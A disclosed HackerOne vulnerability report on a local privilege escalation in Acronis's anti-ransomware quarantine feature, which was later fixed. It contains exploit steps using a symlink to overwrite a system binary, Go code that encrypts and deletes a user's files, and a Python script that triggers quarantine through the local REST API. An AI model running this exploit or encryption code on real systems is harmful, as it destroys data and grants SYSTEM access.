{"id":858598,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTg1OTg=","url":"https://hackerone.com/reports/858598","title":"Local Privilege Escalation in anti_ransomware_service.exe via quarantine","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-04-24T11:18:35.516Z","submitted_at":"2020-04-24T11:18:35.516Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mjoensen","url":"/mjoensen","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13428,"url":"https://hackerone.com/acronis","handle":"acronis","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Acronis","twitter_handle":"Acronis","website":"https://www.acronis.com","about":"Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-06-24T08:21:26.108Z","bug_reporter_agreed_on_going_public_at":"2021-06-24T08:21:26.034Z","team_member_agreed_on_going_public_at":"2021-06-22T06:36:29.089Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"anti_ransomware_service.exe includes a functionality to quarantine files which will copy the suspected ransomware file from one directory to another using SYSTEM privileges. As any unprivileged user has write permissions in the quarantine folder, it is possible to control this privileged write with a hardlink. This means that an unprivileged user can write/overwrite arbitrary files in arbitrary folders. Escalating privileges to SYSTEM is trivial with arbitrary writes. While the quarantine feature is not enabled per default, it can be forced to copy the file to the quarantine by communicating with the anti_ransomware_service.exe through its REST api.\n\nSteps to reproduce:\n1. Download the symbolic link testing tools by James Forshaw:\n    https://github.com/googleprojectzero/symboliclink-testing-tools\n2. Copy a program that simulates ransomware to \"C:\\ProgramData\\ransomware_sim.exe\". This can contain arbitary payload as long as it simulates ransomware while in its original location and execute the arbitrary payload while in the quarantine location. Example code can be found below. WARNING: The example code does encrypt files, so do not use on any important files!!!\n3. Check that \"C:\\Acronis Active Protection Storage\\Quarantine\\\" exist. If not, create these. This is possible as an unprivileged user.\n    mkdir \"C:\\Acronis Active Protection Storage\\Quarantine\\\"\n4. Run \"ransomware_sim.exe C:\\\\Users\\\\UNPRIVILIEGEDUSER\\\\\"\n5. Wait for the ransomware to be detected by Acronis Active Protection. Press block on the Acronis dialog. Do NOT press close on the dialog!\n6. Run CreateSymlink.exe \"C:\\Acronis Active Protection Storage\\Quarantine\\ProgramData\\ransomware_sim.exe\" \"C:\\Windows\\SysWOW64\\dpnsvr.exe\". Keep the command prompt open.\n7. Run the python script move_file_to_quarantine.py that moves the file to quarantine. This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.\n8. Verify \"C:\\Windows\\SysWOW64\\dpnsvr.exe\" have been overwritten with the content of \"C:\\ProgramData\\ransomware_sim.exe\"\n\n\nransomware_sim.exe:\n\"\"\"\n// THIS CODE WILL ENCRYPT FILES!!! BE WARNED!! COMPILE AND RUN AT OWN RISK!\npackage main\n\nimport (\n  \"os\"\n  \"io\"\n  \"fmt\"\n  \"strings\"\n  \"io/ioutil\"\n  \"crypto/md5\"\n  \"crypto/aes\"\n  \"crypto/rand\"\n  \"encoding/hex\"\n  \"crypto/cipher\"\n  \"path/filepath\"\n)\n\nfunc createHash(key string) string {\n  hasher := md5.New()\n  hasher.Write([]byte(key))\n  return hex.EncodeToString(hasher.Sum(nil))\n}\n\nfunc encryptFiles(path string, info os.FileInfo, err error) error {\n  if info.IsDir() {\n    return nil\n  }\n  file, err := os.Open(path)\n  if err != nil {\n    return nil\n  }\n  bytes, err := ioutil.ReadAll(file)\n  if err != nil {\n    panic(err)\n  }\n  cryptBytes := encrypt(bytes, \"password\")\n  ioutil.WriteFile(path+\".crypt\", cryptBytes, 0644)\n  file.Close()\n  err = os.Remove(path)\n  if err != nil {\n    panic(err)\n  }\n  return nil\n}\n\nfunc encrypt(data []byte, passphrase string) []byte {\n  block, _ := aes.NewCipher([]byte(createHash(passphrase)))\n  gcm, err := cipher.NewGCM(block)\n  if err != nil {\n    panic(err.Error())\n  }\n  nonce := make([]byte, gcm.NonceSize())\n  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {\n    panic(err.Error())\n  }\n  ciphertext := gcm.Seal(nonce, nonce, data, nil)\n  return ciphertext\n}\n\n\nfunc main() {\n  dir, _ := os.Getwd()\n  if strings.Contains(dir, \"ProgramData\") {\n    filepath.Walk(os.Args[1], encryptFiles)\n  } else {\n    fmt.Println(\"Run bad code after being moved by anti_ransomware_service.exe\")\n  }\n}\n// THIS CODE WILL ENCRYPT FILES!!! BE WARNED!! COMPILE AND RUN AT OWN RISK!\n\"\"\"\n\nmove_file_to_quarantine.py:\n\"\"\"\nimport requests\nimport json\nimport time\n\nget_headers = {'User-Agent': 'AcronisRestClient', \"Accept\": \"*/*\"}\nput_headers = {'User-Agent': 'AcronisRestClient', \"Accept\": \"application/json\",\n    \"Content-Type\":\"application/json\"}\n\ndata = {\n    \"action\": \"MoveToQuarantine\"\n}\n\nr1 = requests.get(\"http://localhost:6109/alerts\", headers=get_headers)\nalert_id = r1.json()[0][\"uniqueId\"]\nprint(\"Alert ID: {}\".format(alert_id))\nr2 = requests.post(\"http://localhost:6109/alerts/\"+str(alert_id), headers=put_headers, data=json.dumps(data))\n\"\"\"\n\n## Impact\n\nEscalate privileges from standard user to SYSTEM.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["mr-medi","3x3s","cryptographer","ekgaribadmi","ddot"],"severity":{"rating":"medium","score":6.9,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":50772,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Acronis Cyber Protect Home Office (formerly Acronis True Image)","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7784549,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-04-24T15:16:12.295Z","updated_at":"2020-04-24T15:16:12.295Z","additional_data":{"old_title":"Local Privilege Escalation in anti_ransomware_service.exe","new_title":"Local Privilege Escalation in anti_ransomware_service.exe via quarantine"},"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7784698,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi, @mjoensen. \nThanks!","automated_response":false,"created_at":"2020-04-24T15:28:31.291Z","updated_at":"2020-04-24T15:28:31.291Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7820347,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-04-28T08:24:55.443Z","updated_at":"2020-04-28T08:24:55.443Z","actor":{"url":"/acronis","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Acronis"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"acronis","collaborator":{"username":"mjoensen","url":"/mjoensen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8584134,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-07-13T15:11:24.960Z","updated_at":"2020-07-13T15:11:24.960Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Mobile applications","new_scope":"Acronis Agent","genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8785496,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2020-07-28T20:35:27.632Z","updated_at":"2020-07-28T20:35:27.632Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Acronis Agent","new_scope":"Acronis Cyber Protect Home Office (formerly Acronis True Image)","genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8798967,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-07-29T20:48:11.734Z","updated_at":"2020-07-29T20:48:11.734Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Medium (6.9)","old_severity_id":803325,"new_severity_id":804789},"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8799321,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @mjoensen,\n\nAs we discussed, this issue will be fixed in Acronis True Image 2021. \nAcronis True Image 2021 Beta is now available. You can join Beta Program and verify, if this issue is reproducible, https://www.acronis.com/en-us/personal/computer-backup/beta/.","automated_response":false,"created_at":"2020-07-29T21:35:55.048Z","updated_at":"2020-07-29T21:35:55.048Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9021310,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mjoensen,\nWe've just released Acronis True Image 2021 where this bug should be fixed. Please confirm that you are no longer able to reproduce the issue. You can request a trial [here](https://www.acronis.com/en-eu/personal/computer-backup/)\n\nOne note regarding vulnerability details disclosure. Since in this case we're not managing vulnerable installations, we're asking for a standard 90 days remediation time so that as many customers as possible would get an update. \nWe also kindly ask you to share with us content of the requested CVE, so that we could confirm that there is no excessive information disclosure.","automated_response":false,"created_at":"2020-08-24T11:11:44.206Z","updated_at":"2020-08-24T11:11:44.206Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9041624,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for catching this bug!\n\nWe have fixed it, please confirm that you are no longer able to reproduce the issue.\n","automated_response":true,"created_at":"2020-08-26T06:41:13.264Z","updated_at":"2020-08-26T06:41:13.264Z","actor":{"username":"acronis-bot","cleared":false,"url":"/acronis-bot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mjoensen","url":"/mjoensen"},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9043623,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mjoensen,\nWe also mentioned you in Acronis True Image 2021 release notes: https://www.acronis.com/en-us/support/updates/changes.html?p=41682","automated_response":false,"created_at":"2020-08-26T10:49:15.721Z","updated_at":"2020-08-26T10:49:15.721Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9177504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@stushieva, I disagree with the change in severity. All local privilege escalations have a severity of 7.8. I request that the severity is altered to reflect the current standard. As for the CVE, the information is not released until i release a technical blog post on the three bugs I submitted. I intend to respect the 90 days remediation time, so there is no need to worry about excessive information disclosure. This message also applies to #858603 and #858608.","automated_response":false,"created_at":"2020-09-10T08:14:24.399Z","updated_at":"2020-09-10T08:14:24.399Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9179343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mjoensen,\n\nResulting severity is affected by environmental score as well. You can see calculation details here: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H/CR:M/IR:M/AR:L.\n\nWe would highly appreciate if you could share a draft version of the blog post when it is ready so that we could proof-read it and answer your questions, if any.","automated_response":false,"created_at":"2020-09-10T11:31:13.056Z","updated_at":"2020-09-10T11:31:13.056Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9179667,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@stushieva I have not seen the use of environmental score before, but I guess you are right. I will share a draft version when this is ready as a courtesy. As the technical blog post describes the issues from my point of view, I reverse the right to disregard requested changes if i disagree.","automated_response":false,"created_at":"2020-09-10T12:05:13.052Z","updated_at":"2020-09-10T12:05:13.052Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10721470,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mjoensen,\n\nOur development team faced some technical issues trying to fix this vulnerability in other Acronis True Image builds. We kindly ask you to postpone disclosure of any vulnerability details until the end of March. Please let us know if you have any objections. ","automated_response":false,"created_at":"2021-02-19T15:48:18.004Z","updated_at":"2021-02-19T15:48:18.004Z","actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12201503,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-22T06:36:29.127Z","updated_at":"2021-06-22T06:36:29.127Z","first_to_agree":true,"actor":{"username":"stushieva","cleared":false,"url":"/stushieva","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12228879,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-24T08:21:26.065Z","updated_at":"2021-06-24T08:21:26.065Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12228880,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-24T08:21:26.146Z","updated_at":"2021-06-24T08:21:26.146Z","actor":{"username":"mjoensen","cleared":false,"url":"/mjoensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"acronis","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}